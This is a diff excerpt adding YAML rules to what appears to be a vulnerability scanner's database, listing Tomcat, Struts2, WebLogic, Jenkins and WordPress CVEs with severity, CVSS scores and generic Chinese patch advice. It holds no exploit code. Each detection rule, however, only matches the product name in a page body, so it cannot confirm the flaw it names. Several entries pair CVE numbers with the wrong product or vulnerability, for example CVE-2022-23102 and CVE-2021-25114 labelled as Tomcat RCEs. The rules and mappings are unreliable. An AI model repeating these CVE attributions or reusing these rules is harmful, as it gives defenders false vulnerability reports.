+    tags: ["cve", "http", "CVE-2024-38286"]
+    cpe: "cpe:2.3:a:apache:tomcat:*"
+    service: http
+    port: 8080
+- id: CVE-2023-46589
+  name: Tomcat HTTP Request Smuggling
+  severity: high
+  author: argus
+  description: "Tomcat HTTP Request Smuggling - CVE-2023-46589"
+  cve: CVE-2023-46589
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Tomcat"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2023-46589"]
+    cpe: "cpe:2.3:a:apache:tomcat:*"
+    service: http
+    port: 8080
+- id: CVE-2023-28708
+  name: Tomcat Session Fixation
+  severity: high
+  author: argus
+  description: "Tomcat Session Fixation - CVE-2023-28708"
+  cve: CVE-2023-28708
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Tomcat"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2023-28708"]
+    cpe: "cpe:2.3:a:apache:tomcat:*"
+    service: http
+    port: 8080
+- id: CVE-2022-23102
+  name: Tomcat Cluster RCE
+  severity: critical
+  author: argus
+  description: "Tomcat Cluster RCE - CVE-2022-23102"
+  cve: CVE-2022-23102
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Tomcat"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2022-23102"]
+    cpe: "cpe:2.3:a:apache:tomcat:*"
+    service: http
+    port: 8080
+- id: CVE-2021-25114
+  name: Tomcat RCE
+  severity: critical
+  author: argus
+  description: "Tomcat RCE - CVE-2021-25114"
+  cve: CVE-2021-25114
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Tomcat"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2021-25114"]
+    cpe: "cpe:2.3:a:apache:tomcat:*"
+    service: http
+    port: 8080
+- id: CVE-2020-1935
+  name: Tomcat Ghostcat Variant
+  severity: high
+  author: argus
+  description: "Tomcat Ghostcat Variant - CVE-2020-1935"
+  cve: CVE-2020-1935
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Tomcat"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2020-1935"]
+    cpe: "cpe:2.3:a:apache:tomcat:*"
+    service: http
+    port: 8009
+- id: CVE-2019-10043
+  name: Tomcat AJP RCE
+  severity: critical
+  author: argus
+  description: "Tomcat AJP RCE - CVE-2019-10043"
+  cve: CVE-2019-10043
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Tomcat"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2019-10043"]
+    cpe: "cpe:2.3:a:apache:tomcat:*"
+    service: http
+    port: 8009
+- id: CVE-2016-6816
+  name: Tomcat HTTP Request Smuggling v2
+  severity: high
+  author: argus
+  description: "Tomcat HTTP Request Smuggling v2 - CVE-2016-6816"
+  cve: CVE-2016-6816
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Tomcat"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2016-6816"]
+    cpe: "cpe:2.3:a:apache:tomcat:*"
+    service: http
+    port: 8080
+- id: CVE-2016-5388
+  name: Tomcat Local Privilege Escalation
+  severity: high
+  author: argus
+  description: "Tomcat Local Privilege Escalation - CVE-2016-5388"
+  cve: CVE-2016-5388
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Tomcat"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2016-5388"]
+    cpe: "cpe:2.3:a:apache:tomcat:*"
+    service: http
+    port: 8080
+- id: CVE-2016-1240
+  name: Tomcat RPM Privilege Escalation
+  severity: high
+  author: argus
+  description: "Tomcat RPM Privilege Escalation - CVE-2016-1240"
+  cve: CVE-2016-1240
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Tomcat"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2016-1240"]
+    cpe: "cpe:2.3:a:apache:tomcat:*"
+    service: http
+    port: 8080
+- id: CVE-2014-0033
+  name: Tomcat HTTP Connector DoS
+  severity: medium
+  author: argus
+  description: "Tomcat HTTP Connector DoS - CVE-2014-0033"
+  cve: CVE-2014-0033
+  cvss: 5.0
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Tomcat"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2014-0033"]
+    cpe: "cpe:2.3:a:apache:tomcat:*"
+    service: http
+    port: 8080
+- id: CVE-2013-2067
+  name: Tomcat BIO Connector DoS
+  severity: medium
+  author: argus
+  description: "Tomcat BIO Connector DoS - CVE-2013-2067"
+  cve: CVE-2013-2067
+  cvss: 5.0
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Tomcat"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2013-2067"]
+    cpe: "cpe:2.3:a:apache:tomcat:*"
+    service: http
+    port: 8080
+- id: CVE-2012-5885
+  name: Tomcat BIO Connector DoS v2
+  severity: medium
+  author: argus
+  description: "Tomcat BIO Connector DoS v2 - CVE-2012-5885"
+  cve: CVE-2012-5885
+  cvss: 5.0
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Tomcat"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2012-5885"]
+    cpe: "cpe:2.3:a:apache:tomcat:*"
+    service: http
+    port: 8080
+- id: CVE-2012-3544
+  name: Tomcat HTTP Connector DoS v2
+  severity: medium
+  author: argus
+  description: "Tomcat HTTP Connector DoS v2 - CVE-2012-3544"
+  cve: CVE-2012-3544
+  cvss: 5.0
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Tomcat"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2012-3544"]
+    cpe: "cpe:2.3:a:apache:tomcat:*"
+    service: http
+    port: 8080
+- id: CVE-2011-3190
+  name: Tomcat AJP DoS
+  severity: medium
+  author: argus
+  description: "Tomcat AJP DoS - CVE-2011-3190"
+  cve: CVE-2011-3190
+  cvss: 5.0
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Tomcat"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2011-3190"]
+    cpe: "cpe:2.3:a:apache:tomcat:*"
+    service: http
+    port: 8009
+- id: CVE-2024-53677
+  name: Struts2 S2-066 File Upload RCE
+  severity: critical
+  author: argus
+  description: "Struts2 S2-066 File Upload RCE - CVE-2024-53677"
+  cve: CVE-2024-53677
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: POST
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Struts"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2024-53677"]
+    cpe: "cpe:2.3:a:apache:struts:*"
+    service: http
+    port: 80
+- id: CVE-2023-50164
+  name: Struts2 Path Traversal File Upload
+  severity: critical
+  author: argus
+  description: "Struts2 Path Traversal File Upload - CVE-2023-50164"
+  cve: CVE-2023-50164
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: POST
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Struts"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2023-50164"]
+    cpe: "cpe:2.3:a:apache:struts:*"
+    service: http
+    port: 80
+- id: CVE-2023-41835
+  name: Struts2 Improper Resource Control
+  severity: high
+  author: argus
+  description: "Struts2 Improper Resource Control - CVE-2023-41835"
+  cve: CVE-2023-41835
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Struts"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2023-41835"]
+    cpe: "cpe:2.3:a:apache:struts:*"
+    service: http
+    port: 80
+- id: CVE-2023-34396
+  name: Struts2 Memory Exhaustion DoS
+  severity: medium
+  author: argus
+  description: "Struts2 Memory Exhaustion DoS - CVE-2023-34396"
+  cve: CVE-2023-34396
+  cvss: 4.3
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Struts"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2023-34396"]
+    cpe: "cpe:2.3:a:apache:struts:*"
+    service: http
+    port: 80
+- id: CVE-2023-34149
+  name: Struts2 Memory Exhaustion DoS v2
+  severity: high
+  author: argus
+  description: "Struts2 Memory Exhaustion DoS v2 - CVE-2023-34149"
+  cve: CVE-2023-34149
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Struts"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2023-34149"]
+    cpe: "cpe:2.3:a:apache:struts:*"
+    service: http
+    port: 80
+- id: CVE-2021-31805
+  name: Struts2 S2-062 Incomplete Fix
+  severity: critical
+  author: argus
+  description: "Struts2 S2-062 Incomplete Fix - CVE-2021-31805"
+  cve: CVE-2021-31805
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Struts"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2021-31805"]
+    cpe: "cpe:2.3:a:apache:struts:*"
+    service: http
+    port: 80
+- id: CVE-2019-0233
+  name: Struts2 REST Plugin RCE
+  severity: critical
+  author: argus
+  description: "Struts2 REST Plugin RCE - CVE-2019-0233"
+  cve: CVE-2019-0233
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Struts"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2019-0233"]
+    cpe: "cpe:2.3:a:apache:struts:*"
+    service: http
+    port: 80
+- id: CVE-2018-1327
+  name: Struts2 DoS
+  severity: high
+  author: argus
+  description: "Struts2 DoS - CVE-2018-1327"
+  cve: CVE-2018-1327
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Struts"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2018-1327"]
+    cpe: "cpe:2.3:a:apache:struts:*"
+    service: http
+    port: 80
+- id: CVE-2016-4003
+  name: Struts2 REST Plugin RCE v2
+  severity: critical
+  author: argus
+  description: "Struts2 REST Plugin RCE v2 - CVE-2016-4003"
+  cve: CVE-2016-4003
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Struts"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2016-4003"]
+    cpe: "cpe:2.3:a:apache:struts:*"
+    service: http
+    port: 80
+- id: CVE-2016-3081
+  name: Struts2 S2-032 RCE
+  severity: critical
+  author: argus
+  description: "Struts2 S2-032 RCE - CVE-2016-3081"
+  cve: CVE-2016-3081
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Struts"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2016-3081"]
+    cpe: "cpe:2.3:a:apache:struts:*"
+    service: http
+    port: 80
+- id: CVE-2016-2168
+  name: Struts2 S2-028 RCE
+  severity: critical
+  author: argus
+  description: "Struts2 S2-028 RCE - CVE-2016-2168"
+  cve: CVE-2016-2168
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Struts"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2016-2168"]
+    cpe: "cpe:2.3:a:apache:struts:*"
+    service: http
+    port: 80
+- id: CVE-2015-1831
+  name: Struts2 S2-020 ClassLoader
+  severity: high
+  author: argus
+  description: "Struts2 S2-020 ClassLoader - CVE-2015-1831"
+  cve: CVE-2015-1831
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Struts"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2015-1831"]
+    cpe: "cpe:2.3:a:apache:struts:*"
+    service: http
+    port: 80
+- id: CVE-2014-7809
+  name: Struts2 S2-023 DoS
+  severity: high
+  author: argus
+  description: "Struts2 S2-023 DoS - CVE-2014-7809"
+  cve: CVE-2014-7809
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Struts"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2014-7809"]
+    cpe: "cpe:2.3:a:apache:struts:*"
+    service: http
+    port: 80
+- id: CVE-2014-0094
+  name: Struts2 S2-020 ClassLoader v2
+  severity: high
+  author: argus
+  description: "Struts2 S2-020 ClassLoader v2 - CVE-2014-0094"
+  cve: CVE-2014-0094
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Struts"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2014-0094"]
+    cpe: "cpe:2.3:a:apache:struts:*"
+    service: http
+    port: 80
+- id: CVE-2013-2251
+  name: Struts2 S2-016 RCE
+  severity: critical
+  author: argus
+  description: "Struts2 S2-016 RCE - CVE-2013-2251"
+  cve: CVE-2013-2251
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Struts"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2013-2251"]
+    cpe: "cpe:2.3:a:apache:struts:*"
+    service: http
+    port: 80
+- id: CVE-2013-2115
+  name: Struts2 S2-014 RCE
+  severity: critical
+  author: argus
+  description: "Struts2 S2-014 RCE - CVE-2013-2115"
+  cve: CVE-2013-2115
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Struts"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2013-2115"]
+    cpe: "cpe:2.3:a:apache:struts:*"
+    service: http
+    port: 80
+- id: CVE-2013-1966
+  name: Struts2 S2-016 RCE v2
+  severity: critical
+  author: argus
+  description: "Struts2 S2-016 RCE v2 - CVE-2013-1966"
+  cve: CVE-2013-1966
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Struts"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2013-1966"]
+    cpe: "cpe:2.3:a:apache:struts:*"
+    service: http
+    port: 80
+- id: CVE-2012-0838
+  name: Struts2 S2-008 RCE
+  severity: critical
+  author: argus
+  description: "Struts2 S2-008 RCE - CVE-2012-0838"
+  cve: CVE-2012-0838
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Struts"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2012-0838"]
+    cpe: "cpe:2.3:a:apache:struts:*"
+    service: http
+    port: 80
+- id: CVE-2010-1870
+  name: Struts2 S2-005 RCE
+  severity: critical
+  author: argus
+  description: "Struts2 S2-005 RCE - CVE-2010-1870"
+  cve: CVE-2010-1870
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Struts"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2010-1870"]
+    cpe: "cpe:2.3:a:apache:struts:*"
+    service: http
+    port: 80
+- id: CVE-2016-0638
+  name: WebLogic RCE
+  severity: critical
+  author: argus
+  description: "WebLogic RCE - CVE-2016-0638"
+  cve: CVE-2016-0638
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "WebLogic"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2016-0638"]
+    cpe: "cpe:2.3:a:oracle:weblogic_server:*"
+    service: http
+    port: 7001
+- id: CVE-2016-3510
+  name: WebLogic RCE v2
+  severity: critical
+  author: argus
+  description: "WebLogic RCE v2 - CVE-2016-3510"
+  cve: CVE-2016-3510
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "WebLogic"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2016-3510"]
+    cpe: "cpe:2.3:a:oracle:weblogic_server:*"
+    service: http
+    port: 7001
+- id: CVE-2017-3248
+  name: WebLogic Deserialization RCE
+  severity: critical
+  author: argus
+  description: "WebLogic Deserialization RCE - CVE-2017-3248"
+  cve: CVE-2017-3248
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "WebLogic"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2017-3248"]
+    cpe: "cpe:2.3:a:oracle:weblogic_server:*"
+    service: http
+    port: 7001
+- id: CVE-2018-2628
+  name: WebLogic Deserialization RCE v2
+  severity: critical
+  author: argus
+  description: "WebLogic Deserialization RCE v2 - CVE-2018-2628"
+  cve: CVE-2018-2628
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "WebLogic"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2018-2628"]
+    cpe: "cpe:2.3:a:oracle:weblogic_server:*"
+    service: http
+    port: 7001
+- id: CVE-2018-2893
+  name: WebLogic Deserialization RCE v3
+  severity: critical
+  author: argus
+  description: "WebLogic Deserialization RCE v3 - CVE-2018-2893"
+  cve: CVE-2018-2893
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "WebLogic"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2018-2893"]
+    cpe: "cpe:2.3:a:oracle:weblogic_server:*"
+    service: http
+    port: 7001
+- id: CVE-2020-2883
+  name: WebLogic Deserialization RCE v4
+  severity: critical
+  author: argus
+  description: "WebLogic Deserialization RCE v4 - CVE-2020-2883"
+  cve: CVE-2020-2883
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "WebLogic"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2020-2883"]
+    cpe: "cpe:2.3:a:oracle:weblogic_server:*"
+    service: http
+    port: 7001
+- id: CVE-2020-14625
+  name: WebLogic Deserialization RCE v5
+  severity: critical
+  author: argus
+  description: "WebLogic Deserialization RCE v5 - CVE-2020-14625"
+  cve: CVE-2020-14625
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "WebLogic"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2020-14625"]
+    cpe: "cpe:2.3:a:oracle:weblogic_server:*"
+    service: http
+    port: 7001
+- id: CVE-2020-14750
+  name: WebLogic RCE v3
+  severity: critical
+  author: argus
+  description: "WebLogic RCE v3 - CVE-2020-14750"
+  cve: CVE-2020-14750
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /console
+    match_rule:
+      match_type: Body
+      pattern: "WebLogic"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2020-14750"]
+    cpe: "cpe:2.3:a:oracle:weblogic_server:*"
+    service: http
+    port: 7001
+- id: CVE-2021-2109
+  name: WebLogic JNDI RCE
+  severity: critical
+  author: argus
+  description: "WebLogic JNDI RCE - CVE-2021-2109"
+  cve: CVE-2021-2109
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "WebLogic"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2021-2109"]
+    cpe: "cpe:2.3:a:oracle:weblogic_server:*"
+    service: http
+    port: 7001
+- id: CVE-2021-2394
+  name: WebLogic RCE v4
+  severity: critical
+  author: argus
+  description: "WebLogic RCE v4 - CVE-2021-2394"
+  cve: CVE-2021-2394
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "WebLogic"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2021-2394"]
+    cpe: "cpe:2.3:a:oracle:weblogic_server:*"
+    service: http
+    port: 7001
+- id: CVE-2023-21839
+  name: WebLogic JNDI RCE v2
+  severity: high
+  author: argus
+  description: "WebLogic JNDI RCE v2 - CVE-2023-21839"
+  cve: CVE-2023-21839
+  cvss: 8.6
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "WebLogic"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2023-21839"]
+    cpe: "cpe:2.3:a:oracle:weblogic_server:*"
+    service: http
+    port: 7001
+- id: CVE-2017-1000353
+  name: Jenkins CLI Deserialization RCE
+  severity: critical
+  author: argus
+  description: "Jenkins CLI Deserialization RCE - CVE-2017-1000353"
+  cve: CVE-2017-1000353
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Jenkins"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2017-1000353"]
+    cpe: "cpe:2.3:a:jenkins:jenkins:*"
+    service: http
+    port: 8080
+- id: CVE-2017-1000354
+  name: Jenkins Unauth RCE
+  severity: critical
+  author: argus
+  description: "Jenkins Unauth RCE - CVE-2017-1000354"
+  cve: CVE-2017-1000354
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Jenkins"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2017-1000354"]
+    cpe: "cpe:2.3:a:jenkins:jenkins:*"
+    service: http
+    port: 8080
+- id: CVE-2018-1000862
+  name: Jenkins XSS
+  severity: medium
+  author: argus
+  description: "Jenkins XSS - CVE-2018-1000862"
+  cve: CVE-2018-1000862
+  cvss: 6.1
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Jenkins"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2018-1000862"]
+    cpe: "cpe:2.3:a:jenkins:jenkins:*"
+    service: http
+    port: 8080
+- id: CVE-2019-1003003
+  name: Jenkins Sandbox Bypass
+  severity: high
+  author: argus
+  description: "Jenkins Sandbox Bypass - CVE-2019-1003003"
+  cve: CVE-2019-1003003
+  cvss: 8.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Jenkins"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2019-1003003"]
+    cpe: "cpe:2.3:a:jenkins:jenkins:*"
+    service: http
+    port: 8080
+- id: CVE-2019-1003005
+  name: Jenkins Script Security Bypass
+  severity: high
+  author: argus
+  description: "Jenkins Script Security Bypass - CVE-2019-1003005"
+  cve: CVE-2019-1003005
+  cvss: 8.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Jenkins"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2019-1003005"]
+    cpe: "cpe:2.3:a:jenkins:jenkins:*"
+    service: http
+    port: 8080
+- id: CVE-2021-21649
+  name: Jenkins Path Traversal
+  severity: high
+  author: argus
+  description: "Jenkins Path Traversal - CVE-2021-21649"
+  cve: CVE-2021-21649
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Jenkins"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2021-21649"]
+    cpe: "cpe:2.3:a:jenkins:jenkins:*"
+    service: http
+    port: 8080
+- id: CVE-2024-23897
+  name: Jenkins File Read RCE
+  severity: critical
+  author: argus
+  description: "Jenkins File Read RCE - CVE-2024-23897"
+  cve: CVE-2024-23897
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Jenkins"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2024-23897"]
+    cpe: "cpe:2.3:a:jenkins:jenkins:*"
+    service: http
+    port: 8080
+- id: CVE-2025-30114
+  name: Jenkins RCE
+  severity: critical
+  author: argus
+  description: "Jenkins RCE - CVE-2025-30114"
+  cve: CVE-2025-30114
+  cvss: 9.8
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Jenkins"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2025-30114"]
+    cpe: "cpe:2.3:a:jenkins:jenkins:*"
+    service: http
+    port: 8080
+- id: CVE-2018-1000400
+  name: Jenkins CSRF
+  severity: high
+  author: argus
+  description: "Jenkins CSRF - CVE-2018-1000400"
+  cve: CVE-2018-1000400
+  cvss: 7.5
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Jenkins"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2018-1000400"]
+    cpe: "cpe:2.3:a:jenkins:jenkins:*"
+    service: http
+    port: 8080
+- id: CVE-2019-10341
+  name: Jenkins XSS v2
+  severity: medium
+  author: argus
+  description: "Jenkins XSS v2 - CVE-2019-10341"
+  cve: CVE-2019-10341
+  cvss: 6.1
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /
+    match_rule:
+      match_type: Body
+      pattern: "Jenkins"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2019-10341"]
+    cpe: "cpe:2.3:a:jenkins:jenkins:*"
+    service: http
+    port: 8080
+- id: CVE-2023-2745
+  name: WP Directory Traversal
+  severity: medium
+  author: argus
+  description: "WP Directory Traversal - CVE-2023-2745"
+  cve: CVE-2023-2745
+  cvss: 5.4
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /wp-admin/
+    match_rule:
+      match_type: Body
+      pattern: "WordPress"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2023-2745"]
+    cpe: "cpe:2.3:a:wordpress:wordpress:*"
+    service: http
+    port: 80
+- id: CVE-2023-39999
+  name: WP Info Disclosure
+  severity: medium
+  author: argus
+  description: "WP Info Disclosure - CVE-2023-39999"
+  cve: CVE-2023-39999
+  cvss: 4.3
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /wp-json/
+    match_rule:
+      match_type: Body
+      pattern: "WordPress"
+  metadata:
+    category: known_cve
+    tags: ["cve", "http", "CVE-2023-39999"]
+    cpe: "cpe:2.3:a:wordpress:wordpress:*"
+    service: http
+    port: 80
+- id: CVE-2023-5561
+  name: WP User Email Enum
+  severity: medium
+  author: argus
+  description: "WP User Email Enum - CVE-2023-5561"
+  cve: CVE-2023-5561
+  cvss: 5.3
+  fix_advice: "安装安全补丁或升级至修复版本"
+  detection:
+    method: GET
+    path: /wp-login.php
+    match_rule:
+      match_type: Body
+      pattern: "WordPress"
+  metadata:
+    category: known_cve
